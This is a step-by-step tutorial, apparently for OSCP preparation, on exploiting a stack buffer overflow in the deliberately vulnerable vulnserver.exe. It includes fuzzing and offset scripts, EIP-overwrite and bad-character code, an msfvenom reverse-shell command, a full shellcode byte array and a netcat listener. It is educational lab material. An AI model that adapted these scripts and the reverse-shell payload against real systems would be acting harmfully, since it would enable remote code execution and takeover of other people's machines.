---
title: "Buffer Overflow Guide OSCP Basics"
excerpt_separator: "<!--more-->"
author_profile: false
categories:
  - bufferoverflow
tags:
  - learning
  - pentest
  - hacking
  - guide
  - oscp
---

<p align="center">
  <img  src="/assets/images/buffer-overflow.jpg">
</p>

# Buffer Overflow Tutorial 
> Basic EIP Bypass (vulnserver.exe, Windows version)    


### Description

Buffer overflow is probably the best known form of software security vulnerability. Most software developers know what a buffer overflow vulnerability is, but buffer overflow attacks against both legacy and newly-developed applications are still quite common. Part of the problem is due to the wide variety of ways buffer overflows can occur, and part is due to the error-prone techniques often used to prevent them.

A buffer overflow occurs when data written to a buffer also corrupts data values in memory addresses adjacent to the destination buffer due to insufficient bounds checking. This can occur when copying data from one buffer to another without first checking that the data fits within the destination buffer.
In this case, a buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. Writing outside the bounds of a block of allocated memory can corrupt data, crash the program, or cause the execution of malicious code.

# Key Concepts of Buffer Overflow
* This error occurs when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage.
* This vulnerability can cause a system crash or, worse, create an entry point for a cyberattack.
* C and C++ are more susceptible to buffer overflow.
* Secure development practices should include regular testing to detect and fix buffer overflows. These practices include automatic protection at the language level and bounds-checking at run-time.


## Required Tools or Files
* [Immunity Debugger](https://debugger.immunityinc.com/ID_register.py) for Windows  (you can fill out fake info for downloading)
- [Python](https://www.python.org/downloads/) (Code editor and compiler)
- [Visual Studio](https://visualstudio.microsoft.com/) (Code editor)
* [Mona.py](https://github.com/corelan/mona) (Mona module for Immunity debugger)

## Sections
* [Setup](#setup)
* [The Stack](#the-stack)
* [Spiking](#spiking)
* [Fuzzing](#fuzzing)
* [Finding the Offset](#finding-the-offset)
* [Overwrighting the EIP](#overwriting-the-eip)
* [Finding bad charaters](#finding-bad-charaters)
* [Finding the right module](#finding-the-right-module)
* [Generating the shellcode](#generating-the-shellcode)
* [Credits](#credits)


## Setup
**Vulnserver**     
* Download vulnserver and the 'essfunc.dll' (make sure they are together in a folder)
* Connecting. Run 'vulnserver.exe' then you can connect with netcat
Run
```console
vulnserver.exe 9999
```
*Or vulnserver 666 (to use port 666),    
Connect
```console
nc 127.0.0.1 9999
```
127.0.0.1 (localhost) on port 9999    

**Immunity Debugger**    
* Downlaod and install Immunity debugger, then run once and close.
* Install Python 2.7.14 (or a higher 2.7.xx version) into c:\python27, thus overwriting the version that was bundled with Immunity. This is needed to avoid TLS issues when trying to update mona. Make sure you are installing the 32bit version of python.    

**Mona.py**    
* Download Mona.py and place the Mona.py file in 'PyCommands' folder (inside the Immunity Debugger application folder).    

## The Stack
Anatomy of the stack:
When we look into the memory stack, we will find 4 main components:
1. Extended Stack Pointer (ESP)
2. Buffer Space
3. Extended Base Pointer (EBP)
4. Extended Instruction Pointer (EIP) / Return Address
The 4 components above actually sit in order from top to bottom.
<p align="center">
  <img src="/assets/images/esp.png">
</p>

We only really need to be concerned with buffer space and the EIP. Buffer space is used as a storage area for memory in some coding languages. 
With proper input sanitation, information placed into the buffer space should never travel outside of the buffer space itself. Another way to think of this is that information placed into the buffer space should stop at the EBP as such:
<p align="center">
  <img src="/assets/images/esp2.png">
</p>

In the above example, you can see that a a number of A’s (x41) were sent to the buffer space, but were correctly sanitized. The A’s did not escape the buffer space and thus, no buffer overflow occurred. Now, let’s look at an example of a buffer overflow:
<p align="center">
  <img src="/assets/images/esp3.png">
</p>

Now, the A’s have completely escaped the buffer space and have actually reached the EIP... This is an example of a buffer overflow and how poor coding can become dangerous.
If an attacker can gain control of the EIP, he or she can use the pointer to point to malicious code and gain a reverse shell. So lets do that!! 

## Spiking
Spiking is the art of finding a vunerable command withint the applicaion you are attacking. For this example we know that the "TRUN" command is vunerable. 

The vulnerable service command is "TRUN," but in reality, you will likely have to use the script (generic_send_tcp) on multiple commands until the program breaks. 
If you do NOT see any commands to test, proceed to the FAQ at the end of this README.md file.
Run Immunity as Admin.
Run the executable you found. (or downloaded for practice)
Attach to the executable process.
Click the "Play" button in Immunity, ensure it says Running on the bottom right-hand corner.
Use the provided command file

```console
s_readline();
s_string("STATS ");
s_string_variable("0");
```

ensuring that you edit the 'STATS' command with whatever command you're attempting to test ('TRUN' in our case).
```console
generic_send_tcp IP port command.spk 0 0
```

After you utilize the command.spk, look to see if there's an Access Violation in Immunity, if there is not, edit the command within the command.spk to a different one and retest. 

[Expand your knowledge](https://shad0.io/2018/fuzzing-with-spike/)
*Credits: Shad-0

## Fuzzing
Fuzzing is to test the application is veunerable on the found exploitable input (We need to send enough data to crash the application)

fuzz.py Script

```python
#!/usr/bin/python
from __future__ import print_function
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('127.0.0.1',9999))

                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print("Fuzzing crashed at %s bytes" % str(len(buffer)))
```

Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
Restart Immunity debugger + the Exe and attach as you did previously.
Run the script 

```console
python fuzz.py
```

Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity.
Doing so will ensure you can more accurately estimate the bytes it took to crash it.
Write down the number of bytes it took to crash the program. (My test showed: 2118 byte length)


## Finding the Offset
The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.

1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program.

```console
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
Closeout Immunity + the executable program.
3. Repeat the process of relaunching Immunity and attaching to the executable program.

Run the script

```python
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('127.0.0.1',9999))
       s.recv(1024)
       s.send(('TRUN /.:/' + offset + '\r\n').encode())
       s.close()
       print("[+] Poc sent")

except Exception as e:
       print(e)
       print("Error connecting to server")
       sys.exit()
```

```console
python offset.py
```

4. Go into Immunity and look for a number written in the EIP space.

![Eip value](/assets/images/EIP.png)

5. If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
6. When you find a number written to the EIP, write this number down somewhere. (EIP: 386F4337)
Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that is written to the EIP. 
```console
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```
If everything is correct, when you run the above command, you should get an exact offset match that looks like this:
![](/assets/images/offset.png)

Ensure that you write down this offset match.

## Overwriting the EIP
This step will help you ensure that you can control the EIP. If you are successful, you will observe 4 "B" characters within the EIP space(42424242, 42 = B hexidecimal) (Based off of the script code)
1. Restart Immunity + the Exe and attach as you did previously.
2. Edit the provided python script to test your offset

```python
import socket
from time import sleep

ip = "127.0.0.1"
port = 9999

fuzzBuffer = "A"
buffer = ""
command = "TRUN /.:/"

print(f"[*] Connecting to {ip,port}")

buffer = command    
buffer += fuzzBuffer * 2003 + "B" * 4 + "C" * 100 + '\r\n'

print(f"Sending payload, Buffer len: {len(buffer)}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    conn = s.connect((ip, port))
    recv = s.recv(1024)
    s.send(buffer.encode("latin-1"))
except:
    s.close()
    print(f"Program Crashed Buffer Length: {len(buffer)}")
    break
```

3. Replace "2003" with your offset value found, replace the IP, port, and command with your values (as needed).
4. Run the script
```console
python offset.py
```

5. You should now observe 4 "B characters" represented by 42424242 written to the EIP.
![](/assets/images/EIP2.PNG)

6. You now control the EIP. Good job!

## Finding Bad Charaters

Finding Bad Characters
The focus of this section is identifying bad characters so you can ensure they do not get included in your Shellcode.
1. The original script is now modified to use the bad characters.

```python
import socket
from time import sleep

ip = "127.0.0.1"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

fuzzBuffer = "A"
buffer = ""
command = "TRUN /.:/"

print(f"[*] Connecting to {ip,port}")

buffer = command    
buffer += fuzzBuffer * 2003 + "B" * 4 + badchars + '\r\n'

print(f"[*] Sending payload, Buffer len: {len(buffer)}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    conn = s.connect((ip, port))
    recv = s.recv(1024)
    s.send(buffer.encode("latin-1"))
except:
    s.close()
    print(f"Program Crashed Buffer Length: {len(buffer)}")
```

2. Null bytes x00 are automatically considered bad because of issues they tend to cause during Buffer Overflows, make sure that you note that as your first bad character.
3. Edit the provided script, copy the Bad Characters section into a notepad, or somewhere that you can compare them against the Immunity Console. Ensure that you change the IP, Port, and Command within the script with your values.
4. Relaunch Immunity and the executable, attaching to the program as you did in previous steps.
5. Run the script Command:
```console
python badchars.py
```

6. Go to Immunity, right-click on the ESP value, and click on "Follow in Dump."

![](/assets/images/followindump.PNG)

7. Right-click on the Hex Dump tab and click "Appearance -> Font -> OEM" this will make the values a little bigger for comparison.
8. In the Hex Dump, 01 represents the first bad character tested while FF represents the last. The bad characters go in order, compare the Hex Dump with the characters you copied into Notepad.
9. For example, the first line of the Hex Dump could read 01 02 03 04 05, if you see a skip within this order, the character it skips is a bad character. For example, imagine the first line of the Hex Dump read 01 02 03 B0 05, you would now know that 04 is a bad character because it was skipped. You would now annotate x04 as a bad character for later. You have to evaluate all the lines until you hit your first FF.
10. Double-check for bad characters, and then triple check, and then quadruple check. If you do not have the correct list of bad characters to avoid using in your Shellcode, it will fail.    
![Bad Chars](/assets/images/badchars.png)

## Finding the right module

It's time to find what pointer you need to use to direct the program to your Shellcode for the Buffer Overflow

1. Relaunch your Immunity and your program, reattach. This time, do not press the "play" button.

2. Go into Immunity, and in the white space underneath the "terminals" type: 
```console
!mona modules
```
![](/assets/images/mona.png)

3. You will see a bunch of information come up; you are concerned with the Module Info section. You are looking for a module that has all "False" values, preferably a dll, but it could be the actual exe you're attached to depending on the box you're attempting to exploit.
![](/assets/images/monamodules.png)

4. Write down this module, for example, essfunc.dll

5. You are now going to identify the JMP ESP, which is crucial because it represents the pointer value and will be essential for using your Shellcode.

6. JMP ESP converted to hex is FFE4, that's what you're looking for.
```console
#FFE4 = "\xff\xe4"
```

7. Return to that command box you used for mona modules, this time type:
```console
!mona find -s "\xff\xe4" -m essfunc.dll
```

8. The -m switch represents the module that you're trying to find the JMP ESP for, ensure that you swap out essfunc.dll with whatever the module value you wrote down in step 4.

9. When you use the command, you will get a column of results that look like this: 0x625011af 0x625011bb 0x625011c7 0x625011d3 0x625011df 0x625011eb 0x625011f7 0x62501203 0x62501205
![](/assets/images/monamodules2.png)

10. Write down any of the column results that are mostly all "false." You will have to test these. In the instance of vulnserver, the result that will work is 625011af, but if you didn't know that, you might have to perform the next steps on multiple of these false column results.

11. Edit the included script    

```python
import socket
from time import sleep

ip = "127.0.0.1"
port = 9999

fuzzBuffer = "A"
buffer = ""
command = "TRUN /.:/"
eipValue = "\xaf\x11\x50\x62"

print(f"[*] Connecting to {ip,port}")

buffer = command    
buffer += fuzzBuffer * 2003 + eipValue

print(f"Sending payload, Buffer len: {len(buffer)}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    conn = s.connect((ip, port))
    recv = s.recv(1024)
    s.send(buffer.encode("latin-1"))
    s.close()
except:
    s.close()
    print(f"EIP Sent, Buffer Length: {len(buffer)}")
```


Edit the shellcode string with the reversed version of one of the results you got from step 10, for example: 
```python
"\xaf\x11\x50\x62"
```
represents 625011af. 
Ensure you edit the IP, port, and command of the script.

12. Go back to Immunity's CPU window, click the black arrow, and type in the pointer tested to follow the expression (for instance: 625011af)
![](/assets/images/blackarror.png)

13. Click the pointer in the window in the top left-hand corner, click F2, you should see the value highlighted with a color. The objective is to set a break-point for testing.

<p align="center">
  <img src="/assets/images/breakpoint.png">
</p>


14. Now, you can click the "Play" button and observe "Running" in the bottom corner of Immunity.

15. Run the python script Command:
```python
python shellcodetest.py
```

16. If you see the pointer value written to the EIP, you can now generate Shellcode. If you don't see it, repeat the process with other column pointer values you identified as false from Step 9.
![](/assets/images/eip3.png)

## Generating the shellcode
The last step in this process, generating Shellcode and ensuring that we can exploit the system.

1. Restart Immunity/the exe program and get setup.

2. Generate the Payload:
```console
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 EXITFUNC=thread -f c -a x86 -b "\x00"
```
![](/assets/images/exploit.png)

*Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"*

4. Edit the included script.

```python
import socket
from time import sleep

ip = "127.0.0.1"
port = 9999

fuzzBuffer = "A"
buffer = ""
nops = "\x90"
command = "TRUN /.:/"
eipValue = "\xaf\x11\x50\x62"

shellcode =("\xbe\x3d\x34\xbd\x7a\xdb\xd0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x72\x12\x83\xc2\x04\x03\x4f\x3a\x5f\x8f\x53\xaa\x1d"
"\x70\xab\x2b\x42\xf8\x4e\x1a\x42\x9e\x1b\x0d\x72\xd4\x49\xa2"
"\xf9\xb8\x79\x31\x8f\x14\x8e\xf2\x3a\x43\xa1\x03\x16\xb7\xa0"
"\x87\x65\xe4\x02\xb9\xa5\xf9\x43\xfe\xd8\xf0\x11\x57\x96\xa7"
"\x85\xdc\xe2\x7b\x2e\xae\xe3\xfb\xd3\x67\x05\x2d\x42\xf3\x5c"
"\xed\x65\xd0\xd4\xa4\x7d\x35\xd0\x7f\xf6\x8d\xae\x81\xde\xdf"
"\x4f\x2d\x1f\xd0\xbd\x2f\x58\xd7\x5d\x5a\x90\x2b\xe3\x5d\x67"
"\x51\x3f\xeb\x73\xf1\xb4\x4b\x5f\x03\x18\x0d\x14\x0f\xd5\x59"
"\x72\x0c\xe8\x8e\x09\x28\x61\x31\xdd\xb8\x31\x16\xf9\xe1\xe2"
"\x37\x58\x4c\x44\x47\xba\x2f\x39\xed\xb1\xc2\x2e\x9c\x98\x8a"
"\x83\xad\x22\x4b\x8c\xa6\x51\x79\x13\x1d\xfd\x31\xdc\xbb\xfa"
"\x36\xf7\x7c\x94\xc8\xf8\x7c\xbd\x0e\xac\x2c\xd5\xa7\xcd\xa6"
"\x25\x47\x18\x68\x75\xe7\xf3\xc9\x25\x47\xa4\xa1\x2f\x48\x9b"
"\xd2\x50\x82\xb4\x79\xab\x45\xc4\x7d\xb3\x94\x52\x7c\xb3\xb4"
"\x1a\x09\x55\xd2\x4a\x5c\xce\x4b\xf2\xc5\x84\xea\xfb\xd3\xe1"
"\x2d\x77\xd0\x16\xe3\x70\x9d\x04\x94\x70\xe8\x76\x33\x8e\xc6"
"\x1e\xdf\x1d\x8d\xde\x96\x3d\x1a\x89\xff\xf0\x53\x5f\x12\xaa"
"\xcd\x7d\xef\x2a\x35\xc5\x34\x8f\xb8\xc4\xb9\xab\x9e\xd6\x07"
"\x33\x9b\x82\xd7\x62\x75\x7c\x9e\xdc\x37\xd6\x48\xb2\x91\xbe"
"\x0d\xf8\x21\xb8\x11\xd5\xd7\x24\xa3\x80\xa1\x5b\x0c\x45\x26"
"\x24\x70\xf5\xc9\xff\x30\x15\x28\xd5\x4c\xbe\xf5\xbc\xec\xa3"
"\x05\x6b\x32\xda\x85\x99\xcb\x19\x95\xe8\xce\x66\x11\x01\xa3"
"\xf7\xf4\x25\x10\xf7\xdc")

print(f"[*] Connecting to {ip,port}")

buffer = command    
buffer += fuzzBuffer * 2003 + eipValue + nops * 32 + shellcode

print(f"Sending payload, Buffer len: {len(buffer)}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    conn = s.connect((ip, port))
    recv = s.recv(1024)
    s.send(buffer.encode("latin-1"))
    s.close()
except:
    s.close()
    print(f"EIP Sent, Buffer Length: {len(buffer)}")
```

Ensure that your exploitation IP and Port and command values are correct. Take your generated Shellcode and replace the overflow value that is currently in the script.

5. Ensure that all variables are correct, including your exact byte value, pointer value, etc.

6. Start your netcat listener: 
```console
nc -lnvp 4444
```
![](/assets/images/listen.png)


7. Run the script:
```console
python bofpoc.py
```

8. If the shell doesn't catch, try to change the padding value in the script from 32 to 16 or 8. It may take some trial and error.

9. You should now have a shell, congratulations.
![](/assets/images/win.png)


## Credits
> Stephen Bradshaw: (https://github.com/stephenbradshaw/vulnserver)    
> TheCyberMentor: (https://www.thecybermentor.com/buffer-overflows-made-easy)   
> 0xRick's Blog : (https://0xrick.github.io/binary-exploitation/bof1/)    
> Detailed Spike Fuzzing: (https://samsclass.info/127/proj/p18-spike.htm)    
